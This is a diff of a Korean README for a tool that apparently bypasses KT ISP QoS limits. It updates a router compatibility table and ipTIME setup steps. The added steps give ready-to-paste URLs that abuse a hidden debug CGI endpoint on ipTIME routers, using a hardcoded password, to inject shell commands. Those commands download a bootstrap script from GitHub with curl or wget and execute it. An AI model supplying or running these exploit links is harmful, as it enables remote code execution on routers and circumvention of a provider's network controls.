@@ -48,7 +48,7 @@ KT GiGA WiFi (통신사 공유기, 기본값 설정인 KT 모드가 필요) - �
 |KM06-506H, KM06-704H,<br>DW02-412H|？|✕|？|
 |KM08-708H, DV01-901H,<br>TI04-708H Wave2|？|？|？|
 |KM12-007H<br>GiGA WiFi home ax|？|？|？|
-|KM17-305H<br>GiGA WiFi home ax|？|？|？|
+|KM17-305H<br>GiGA WiFi home ax|〇|〇|？|
 |KM15-103H<br>GiGA WiFi home ax|〇|〇|〇|
 |DV02-012H<br>GiGA WiFi home ax|〇|〇|✕|
 |HR08-407H<br>GiGA WiFi home ax|〇|✕|〇|
@@ -138,7 +138,9 @@ iptime(알파테스트중)
 
 2. 아래 링크 중 하나를 직접 클릭하지 말고 로그인한 관리자 페이지의 주소 칸에 붙여넣어 진행하세요. 관리자 계정/비밀번호를 설정하지 않은 경우 동작하지 않습니다:
 
-http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
+http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=curl%20-Lo%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
+
+또는 http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
 
   이때 아래와 같은 메시지가 표시된다면 원본 링크의 암호화된 연결을 지원하지 않는 환경이므로 각자 웹서버를 준비하거나 아래에 미리 준비된 미러 링크를 사용해야 합니다
    
